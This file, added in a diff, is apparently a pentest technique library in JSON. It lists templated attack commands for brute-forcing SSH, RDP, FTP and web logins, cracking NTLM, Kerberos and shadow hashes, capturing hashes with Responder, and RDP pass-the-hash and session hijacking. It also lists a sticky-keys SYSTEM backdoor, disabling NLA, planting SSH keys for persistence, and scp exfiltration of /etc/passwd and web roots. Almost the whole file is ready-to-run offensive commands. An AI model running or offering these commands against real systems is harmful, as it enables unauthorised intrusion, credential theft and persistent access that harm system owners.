@@ -1,0 +1,55 @@
+[
+  {
+    "category": "Password Attacks",
+    "techniques": [
+      {"id":"pass_1","name":"Hydra SSH Brute Force","purpose":"Brute force SSH login","when_to_use":"When SSH is open and you have a username","command":"hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP} -t 4 -V","tags":["hydra","ssh","brute"]},
+      {"id":"pass_2","name":"Hydra RDP Brute Force","purpose":"Brute force RDP credentials","when_to_use":"When RDP (3389) is open","command":"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://{TARGET_IP} -t 1 -W 3","tags":["hydra","rdp","brute"]},
+      {"id":"pass_3","name":"Hydra HTTP POST Brute Force","purpose":"Brute force web login form","when_to_use":"When a login form exists","command":"hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt {TARGET_IP} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid credentials'","tags":["hydra","web","brute"]},
+      {"id":"pass_4","name":"Hydra FTP Brute Force","purpose":"Brute force FTP credentials","when_to_use":"When FTP (21) is open","command":"hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt ftp://{TARGET_IP}","tags":["hydra","ftp","brute"]},
+      {"id":"pass_5","name":"Hashcat NTLM Crack","purpose":"Crack NTLM hash offline","when_to_use":"After dumping NTLM hashes","command":"hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force","tags":["hashcat","ntlm","crack"]},
+      {"id":"pass_6","name":"Hashcat NetNTLMv2 Crack","purpose":"Crack captured NetNTLMv2 hashes","when_to_use":"After capturing with Responder","command":"hashcat -m 5600 -a 0 netntlm.txt /usr/share/wordlists/rockyou.txt --force","tags":["hashcat","ntlm","crack"]},
+      {"id":"pass_7","name":"Hashcat Kerberoast TGS Crack","purpose":"Crack Kerberos TGS tickets","when_to_use":"After Kerberoasting","command":"hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt --force","tags":["hashcat","kerberos","crack"]},
+      {"id":"pass_8","name":"Hashcat MD5 Crack","purpose":"Crack MD5 hash","when_to_use":"When you have an MD5 hash","command":"hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt","tags":["hashcat","md5","crack"]},
+      {"id":"pass_9","name":"John the Ripper Auto","purpose":"Auto-detect hash type and crack","when_to_use":"Quick hash cracking","command":"john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt && john --show hash.txt","tags":["john","crack"]},
+      {"id":"pass_10","name":"John SSH Key Crack","purpose":"Crack passphrase-protected SSH key","when_to_use":"When you have an encrypted id_rsa","command":"ssh2john id_rsa > id_rsa.hash && john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash","tags":["john","ssh","crack"]},
+      {"id":"pass_11","name":"CrackMapExec Password Spray","purpose":"Spray one password across many users","when_to_use":"When you have a user list and one password","command":"crackmapexec smb {TARGET_IP} -u users.txt -p '{PASSWORD}' --continue-on-success","tags":["cme","spray","smb"]},
+      {"id":"pass_12","name":"Kerbrute User Enumeration","purpose":"Enumerate valid AD usernames via Kerberos","when_to_use":"When targeting AD without credentials","command":"kerbrute userenum -d {TARGET_DOMAIN} --dc {TARGET_IP} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt","tags":["kerbrute","ad","enum"]},
+      {"id":"pass_13","name":"Responder NTLM Capture","purpose":"Capture NetNTLMv2 hashes on the network","when_to_use":"When on same network segment as target","command":"sudo responder -I eth0 -wrf","tags":["responder","ntlm","capture"]},
+      {"id":"pass_14","name":"Unshadow + John (Linux)","purpose":"Crack Linux /etc/shadow passwords","when_to_use":"After reading /etc/passwd and /etc/shadow","command":"unshadow /etc/passwd /etc/shadow > unshadowed.txt && john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt","tags":["john","linux","crack"]}
+    ]
+  },
+  {
+    "category": "RDP Attacks",
+    "techniques": [
+      {"id":"rdp_1","name":"RDP Login via xfreerdp","purpose":"Connect to Windows machine over RDP","when_to_use":"When port 3389 is open and you have credentials","command":"xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp","tags":["rdp","xfreerdp"]},
+      {"id":"rdp_2","name":"RDP Pass-the-Hash","purpose":"Authenticate to RDP using NTLM hash (no plaintext needed)","when_to_use":"When Restricted Admin Mode is enabled on target","command":"xfreerdp /v:{TARGET_IP} /u:{USERNAME} /pth:{PASSWORD} /cert:ignore +clipboard","tags":["rdp","pth","xfreerdp"]},
+      {"id":"rdp_3","name":"RDP with Domain","purpose":"RDP login specifying domain","when_to_use":"When target is domain-joined","command":"xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /d:{TARGET_DOMAIN} /cert:ignore +clipboard","tags":["rdp","domain","xfreerdp"]},
+      {"id":"rdp_4","name":"RDP Port Check + Encryption Info","purpose":"Verify RDP is open and get encryption details","when_to_use":"Initial enumeration","command":"nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 {TARGET_IP}","tags":["rdp","nmap"]},
+      {"id":"rdp_5","name":"RDP Brute Force via Hydra","purpose":"Brute force RDP credentials","when_to_use":"When RDP is open and you have a username list","command":"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://{TARGET_IP} -t 1 -W 3 -V","tags":["rdp","hydra","brute"]},
+      {"id":"rdp_6","name":"RDP via Proxychains (Pivot)","purpose":"Access RDP through a pivot host","when_to_use":"When RDP target is on internal network","command":"proxychains xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /cert:ignore","tags":["rdp","pivot","proxychains"]},
+      {"id":"rdp_7","name":"Enable RDP via Registry","purpose":"Enable RDP on compromised Windows host","when_to_use":"After gaining admin shell on Windows","command":"reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f","tags":["rdp","windows","enable"]},
+      {"id":"rdp_8","name":"Enable RDP via PowerShell","purpose":"Enable RDP and disable NLA","when_to_use":"After gaining PowerShell access","command":"Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -Value 0; Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name UserAuthentication -Value 0","tags":["rdp","powershell","enable"]},
+      {"id":"rdp_9","name":"Add Firewall Rule for RDP","purpose":"Allow RDP through Windows firewall","when_to_use":"After enabling RDP if firewall blocks it","command":"netsh advfirewall firewall add rule name='RDP' protocol=TCP dir=in localport=3389 action=allow","tags":["rdp","firewall","windows"]},
+      {"id":"rdp_10","name":"RDP Session Hijack (SYSTEM)","purpose":"Hijack another user's active RDP session","when_to_use":"When SYSTEM privileges are available","command":"query session && tscon {SESSION_ID} /dest:{YOUR_SESSION}","tags":["rdp","hijack","privesc"]},
+      {"id":"rdp_11","name":"RDP Tunneling via SSH","purpose":"Tunnel RDP over SSH to bypass firewall","when_to_use":"When RDP is blocked but SSH is open","command":"ssh -L 13389:{TARGET_IP}:3389 {USERNAME}@{PIVOT_IP} -N && xfreerdp /v:127.0.0.1:13389 /u:{USERNAME} /p:{PASSWORD} /cert:ignore","tags":["rdp","ssh","tunnel"]},
+      {"id":"rdp_12","name":"Sticky Keys Backdoor","purpose":"Get SYSTEM shell from RDP login screen","when_to_use":"When you have admin access and want persistence","command":"REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\"","tags":["rdp","backdoor","persistence"]}
+    ]
+  },
+  {
+    "category": "SSH Attacks",
+    "techniques": [
+      {"id":"ssh_1","name":"SSH Login","purpose":"Connect to remote host via SSH","when_to_use":"When SSH (22) is open and you have credentials","command":"ssh {USERNAME}@{TARGET_IP}","tags":["ssh"]},
+      {"id":"ssh_2","name":"SSH with Private Key","purpose":"Authenticate using SSH private key","when_to_use":"When you have found an id_rsa file","command":"chmod 600 id_rsa && ssh -i id_rsa {USERNAME}@{TARGET_IP}","tags":["ssh","key"]},
+      {"id":"ssh_3","name":"SSH on Non-Standard Port","purpose":"Connect to SSH running on alternate port","when_to_use":"When SSH is not on port 22","command":"ssh -p 2222 {USERNAME}@{TARGET_IP}","tags":["ssh","port"]},
+      {"id":"ssh_4","name":"SCP Upload File","purpose":"Upload file to remote host via SSH","when_to_use":"When transferring files to target","command":"scp /local/file.txt {USERNAME}@{TARGET_IP}:/tmp/file.txt","tags":["ssh","scp","transfer"]},
+      {"id":"ssh_5","name":"SCP Download File","purpose":"Download file from remote host","when_to_use":"When exfiltrating files from target","command":"scp {USERNAME}@{TARGET_IP}:/etc/passwd /tmp/passwd","tags":["ssh","scp","transfer"]},
+      {"id":"ssh_6","name":"SCP Download Directory","purpose":"Download entire directory recursively","when_to_use":"When exfiltrating multiple files","command":"scp -r {USERNAME}@{TARGET_IP}:/var/www/html /tmp/webroot","tags":["ssh","scp","transfer"]},
+      {"id":"ssh_7","name":"SSH Local Port Forward","purpose":"Forward a remote port to localhost","when_to_use":"To access internal services through SSH","command":"ssh -L 8080:{TARGET_IP}:80 {USERNAME}@{PIVOT_IP} -N -f","tags":["ssh","tunnel","pivot"]},
+      {"id":"ssh_8","name":"SSH Dynamic SOCKS Proxy","purpose":"Route all traffic through SSH SOCKS5 tunnel","when_to_use":"When pivoting into internal network","command":"ssh -D 1080 {USERNAME}@{PIVOT_IP} -N -f && proxychains nmap -sT {TARGET_IP}","tags":["ssh","socks","pivot"]},
+      {"id":"ssh_9","name":"SSH Remote Port Forward","purpose":"Expose internal port to attacker machine","when_to_use":"When getting reverse shell through firewall","command":"ssh -R 4444:localhost:4444 {USERNAME}@{TARGET_IP} -N","tags":["ssh","tunnel","reverse"]},
+      {"id":"ssh_10","name":"SSH Brute Force","purpose":"Brute force SSH credentials","when_to_use":"When SSH is open and no creds available","command":"hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP} -t 4 -V","tags":["ssh","hydra","brute"]},
+      {"id":"ssh_11","name":"SSH Key Generation + Deploy","purpose":"Generate SSH key pair and add to target","when_to_use":"After gaining write access to ~/.ssh/","command":"ssh-keygen -t rsa -b 4096 -f /tmp/htb_key -N '' && cat /tmp/htb_key.pub >> /home/{USERNAME}/.ssh/authorized_keys && ssh -i /tmp/htb_key {USERNAME}@{TARGET_IP}","tags":["ssh","key","persistence"]},
+      {"id":"ssh_12","name":"SFTP Interactive Session","purpose":"Browse and transfer files interactively","when_to_use":"When you need to navigate remote filesystem","command":"sftp {USERNAME}@{TARGET_IP}","tags":["ssh","sftp","transfer"]}
+    ]
+  }
+]
